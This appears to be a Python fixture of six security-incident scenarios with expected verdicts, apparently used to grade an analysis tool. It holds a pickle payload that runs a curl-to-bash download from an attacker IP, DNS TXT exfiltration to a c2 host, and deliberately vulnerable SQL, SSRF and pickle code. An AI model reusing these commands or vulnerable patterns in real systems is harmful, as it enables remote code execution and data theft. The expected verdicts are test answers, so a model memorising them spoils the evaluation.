"""Built-in dialectical cybersecurity scenarios with logs, code, and ground truth."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, List

from hermes_cyber.models import ScenarioDescriptor, VerdictType


@dataclass(frozen=True)
class CyberScenario:
    scenario_id: str
    title: str
    category: str
    description: str
    source_kind: str
    expected_verdict: VerdictType
    is_ambiguous: bool
    expected_contradiction_keywords: tuple[str, ...]
    artifact_text: str


_SCENARIOS: tuple[CyberScenario, ...] = (
    CyberScenario(
        scenario_id="scen-01-ransomware-vs-backup",
        title="Ransomware Alarm vs Signed Nightly Backup",
        category="Contradiction Forensics (Endpoint / EDR)",
        description=(
            "Mass .enc file writes and a vssadmin shadow query trigger a ransomware alert, "
            "but cryptographic binary verification, maintenance window, and VLAN identity refute malware."
        ),
        source_kind="log",
        expected_verdict=VerdictType.FALSE_POSITIVE_BENIGN,
        is_ambiguous=False,
        expected_contradiction_keywords=("signed", "maintenance", "backup", "10.20.1.5"),
        artifact_text="\n".join([
            '2026-11-16T02:01:03Z host=srv-fin-01 actor=svc_backup_nightly proc=vssadmin.exe cmd="vssadmin list shadows" alert="EDR-HIGH: shadow copy enum"',
            '2026-11-16T02:01:08Z host=srv-fin-01 actor=svc_backup_nightly proc=restic cmd="restic backup /srv/finance/ledger.db" writes_enc_ext=1420',
            '2026-11-16T02:01:12Z host=srv-fin-01 net_dst=10.20.1.5 port=8443 proto=TLS bytes_out=482190112 desc="high entropy encrypted volume stream"',
            '2026-11-16T02:01:13Z host=srv-fin-01 auth=ChangeControl ticket=CHG-9041 window="02:00-03:00 UTC" approved_job="nightly_restic_ledger" status=ACTIVE',
            '2026-11-16T02:01:14Z host=srv-fin-01 proc=restic signer="CN=Restic Release Signing Key" signature_verified=true sha256_trusted=true',
            '2026-11-16T02:01:15Z host=srv-fin-01 net_dst=10.20.1.5 zone=AUTHORIZED_BACKUP_VLAN ransomware_note=false vss_deleted=false',
            '[BASELINE] 2026-11-16T01:55:00Z host=srv-fin-01 proc=systemd cmd="systemctl status backup.timer" state=scheduled user=svc_backup_nightly',
            '[BASELINE] 2026-11-16T02:02:00Z host=srv-fin-01 endpoint=/healthz status=200 user=monitoring benign=true',
        ]),
    ),
    CyberScenario(
        scenario_id="scen-02-ddos-masking-dns-exfil",
        title="Noisy HTTP Flood Masking Silent DNS Exfiltration",
        category="Multi-Stage Exfiltration & Evasion",
        description=(
            "A loud HTTP 503 flood floods the SOC queue while an internal DB host leaks a token "
            "and exfiltrates staging dumps over Base32 TXT DNS queries."
        ),
        source_kind="log",
        expected_verdict=VerdictType.CONFIRMED_ATTACK,
        is_ambiguous=False,
        expected_contradiction_keywords=("dns", "txt", "c2-sync", "10.10.4.22"),
        artifact_text="\n".join([
            '2026-11-16T11:10:01Z src=198.51.100.77 method=GET /api/search HTTP/1.1 status=503 rate=9400rps alert="HTTP Flood DDoS"',
            '2026-11-16T11:10:02Z src=203.0.113.45 method=GET /api/search HTTP/1.1 status=503 alert="WAF edge rate-limit"',
            '2026-11-16T11:10:05Z host=db-core-02 ip=10.10.4.22 event=token_leak user=svc_etl token="Bearer eyJhbGciOiJIUzI1NiJ9.dGVzdHBheWxvYWQ.c2lnbg"',
            '2026-11-16T11:10:09Z host=db-core-02 ip=10.10.4.22 proc=powershell.exe cmd="powershell -enc SQBFAFgA" child_of=mysqld',
            '2026-11-16T11:10:12Z dns_src=10.10.4.22 qtype=TXT query="MZXW6YTBOJRGC3LFON2G4.exfil.c2-sync.example.net" bytes=312 entropy=4.9',
            '2026-11-16T11:10:18Z dns_src=10.10.4.22 qtype=TXT query="KRSXG5DJNZTXIYLUMVZA.exfil.c2-sync.example.net" bytes=328 entropy=5.0',
            '2026-11-16T11:10:25Z host=db-core-02 policy_check="maintenance_window=false dns_txt_authorized=false"',
            '[BASELINE] 2026-11-16T11:09:00Z dns_src=10.10.4.5 qtype=A query="ntp.ubuntu.com" status=NOERROR benign=true',
            '[BASELINE] 2026-11-16T11:11:00Z src=10.10.1.12 method=GET /health HTTP/1.1 status=200 healthcheck=200 ok',
        ]),
    ),
    CyberScenario(
        scenario_id="scen-03-sqli-ssrf-code-chain",
        title="SQLi + SSRF Metadata Pivot + Privileged Container Chain",
        category="Offensive Code & Cloud IaC Audit",
        description=(
            "Vulnerable API query concatenation feeds a dynamic SSRF fetch to cloud IMDSv1 inside "
            "a privileged Kubernetes container, creating a 3-hop credential takeover chain."
        ),
        source_kind="code",
        expected_verdict=VerdictType.EXPLOITABLE_CHAIN,
        is_ambiguous=False,
        expected_contradiction_keywords=("privileged", "169.254.169.254", "sql", "ssrf"),
        artifact_text="\n".join([
            '@app.get("/api/v1/export")',
            'def export_customer_report(tenant_id: str, webhook_url: str, user_token: str):',
            '    query = f"SELECT id, webhook_url FROM reports WHERE tenant_id = \'{tenant_id}\' AND enabled = 1"',
            '    rows = db.execute(query).fetchall()',
            '    # SSRF sink: user-supplied or DB-poisoned webhook_url passed without allowlist to requests.get',
            '    meta = requests.get(webhook_url, timeout=3, headers={"Authorization": user_token}).text',
            '    return {"rows": len(rows), "preview": meta}',
            '# deploy/k8s-deployment.yaml snippet:',
            'apiVersion: apps/v1',
            'kind: Deployment',
            'spec: template: spec: containers: - name: report-api securityContext: privileged: true allowPrivilegeEscalation: true',
            '# Simulated access log showing live probe reaching AWS metadata:',
            '2026-11-16T14:22:01Z src=45.33.32.156 method=GET /api/v1/export?tenant_id=%27+UNION+SELECT+1%2C%27http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2F&webhook_url=http://169.254.169.254/latest/meta-data/iam/ status=200',
            '[BASELINE] 2026-11-16T14:20:00Z src=10.10.0.10 method=GET /api/v1/health HTTP/1.1 status=200 healthcheck=200 ok',
        ]),
    ),
    CyberScenario(
        scenario_id="scen-04-bruteforce-vs-stale-cron",
        title="Credential Stuffing Alarm vs Stale Monitoring Cron",
        category="Contradiction Forensics (Auth / Identity)",
        description=(
            "350 failed authentication attempts for svc_metrics suggest brute-force, "
            "but exact 5s cron cadence, recent password rotation, and Prometheus internal host prove benign misconfig."
        ),
        source_kind="log",
        expected_verdict=VerdictType.FALSE_POSITIVE_BENIGN,
        is_ambiguous=False,
        expected_contradiction_keywords=("rotation", "prometheus", "10.10.2.10", "5.0s"),
        artifact_text="\n".join([
            '2026-11-16T08:00:00Z auth_event=PasswordPolicyChange user=svc_metrics changed_by=adm_sec ticket=SEC-310 "Secret rotated at 08:00:00Z"',
            '2026-11-16T08:00:05Z src=10.10.2.10 endpoint=/api/v1/metrics auth=FAILED user=svc_metrics agent="Prometheus-Poller/2.4" interval=5.0s attempt=1',
            '2026-11-16T08:00:10Z src=10.10.2.10 endpoint=/api/v1/metrics auth=FAILED user=svc_metrics agent="Prometheus-Poller/2.4" interval=5.0s attempt=2',
            '2026-11-16T08:29:10Z src=10.10.2.10 endpoint=/api/v1/metrics auth=FAILED user=svc_metrics agent="Prometheus-Poller/2.4" total_attempts=350 alert="SOC-MED: BruteForce detected"',
            '2026-11-16T08:29:12Z cmdb_host=10.10.2.10 role="internal-prometheus-scraper" password_spray_targets=1 unique_usernames=1 success_after_fail=false',
            '2026-11-16T08:29:15Z auth_audit user=svc_metrics lock_reason="stale secret in k8s cronjob prometheus-poller" external_ingress=false',
            '[BASELINE] 2026-11-16T07:59:55Z src=10.10.2.10 endpoint=/api/v1/metrics auth=SUCCESS user=svc_metrics agent="Prometheus-Poller/2.4" benign=true',
        ]),
    ),
    CyberScenario(
        scenario_id="scen-05-ambiguous-lateral-movement",
        title="Ambiguous Admin WMI/SMB Session with Missing VPN Logs",
        category="Telemetry Gap & Abstention Calibration",
        description=(
            "Admin account adm_rossi executes WMI on DB host from workstation 10.10.8.44, "
            "but OpenVPN gateway logs are unavailable, making compromised PTH vs legit remote admin indistinguishable."
        ),
        source_kind="log",
        expected_verdict=VerdictType.INSUFFICIENT_EVIDENCE,
        is_ambiguous=True,
        expected_contradiction_keywords=("unavailable", "truncated", "openvpn", "ambiguous"),
        artifact_text="\n".join([
            '2026-11-16T17:40:10Z host=db-prod-01 src=10.10.8.44 user=adm_rossi proto=SMB event="4624 Session Opened" alert="WMI remote exec"',
            '2026-11-16T17:40:15Z host=db-prod-01 src=10.10.8.44 user=adm_rossi proc=wmic cmd="wmic /node:db-prod-01 service list brief"',
            '2026-11-16T17:40:18Z host=ws-eng-44 ip=10.10.8.44 owner=adm_rossi note="Scheduled audit not registered; emergency hotfix possible"',
            '2026-11-16T17:40:20Z collector=siem-ingest source=openvpn-gw status=LogSourceUnavailable reason="VPN auth logs truncated between 17:30Z and 17:50Z"',
            '2026-11-16T17:40:22Z collector=siem-ingest source=kerberos-dc status=ambiguous missing_fields="LogonType,TicketEncryption"',
            '[BASELINE] 2026-11-16T17:35:00Z host=db-prod-01 src=10.10.1.5 user=monitoring endpoint=/metrics status=200 benign=true',
        ]),
    ),
    CyberScenario(
        scenario_id="scen-06-waf-bypass-deserialization",
        title="WAF Bypass Split-Header Payload -> Shell Reverse Pivot",
        category="WAF Evasion & Code Execution",
        description=(
            "A healthcheck-like HTTP request uses header smuggling / base64 deserialization to slip past "
            "a naive WAF regex and spawn sh -c curl from the app worker."
        ),
        source_kind="http",
        expected_verdict=VerdictType.CONFIRMED_ATTACK,
        is_ambiguous=False,
        expected_contradiction_keywords=("sh -c", "curl", "waf_bypass", "pickle"),
        artifact_text="\n".join([
            '2026-11-16T19:02:01Z src=91.132.147.18 method=POST /api/v2/session/restore HTTP/1.1 X-Token-Fmt="base64" waf_status=ALLOWED note="naive WAF only inspected query string"',
            'def restore_session_blob(raw_b64: str): return pickle.loads(base64.b64decode(raw_b64))',
            '2026-11-16T19:02:02Z src=91.132.147.18 payload_b64="gASVNAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9zaCAtYyAiY3VybCBodHRwOi8vOTEuMTMyLjE0Ny4xOC9zLnNoIHwgYmFzaCKUhZRSlC4=" status=200',
            '2026-11-16T19:02:03Z host=web-api-03 parent_proc=python3 proc=sh cmd="sh -c curl http://91.132.147.18/s.sh | bash" pid=4192',
            '2026-11-16T19:02:04Z host=web-api-03 egress_dst=91.132.147.18 port=80 bytes_out=1840 alert="Unauthorized worker shell spawn"',
            '[BASELINE] 2026-11-16T19:01:50Z src=10.10.0.5 method=GET /health HTTP/1.1 status=200 healthcheck=200 ok',
        ]),
    ),
)

SCENARIO_MAP: Dict[str, CyberScenario] = {s.scenario_id: s for s in _SCENARIOS}


def list_scenario_descriptors() -> List[ScenarioDescriptor]:
    return [
        ScenarioDescriptor(
            scenario_id=s.scenario_id,
            title=s.title,
            category=s.category,
            description=s.description,
            expected_verdict=s.expected_verdict,
            is_ambiguous=s.is_ambiguous,
            source_kind=s.source_kind,
        )
        for s in _SCENARIOS
    ]


def get_scenario(scenario_id: str) -> CyberScenario:
    if scenario_id not in SCENARIO_MAP:
        raise KeyError(f"Scenario cyber non trovato: '{scenario_id}'.")
    return SCENARIO_MAP[scenario_id]
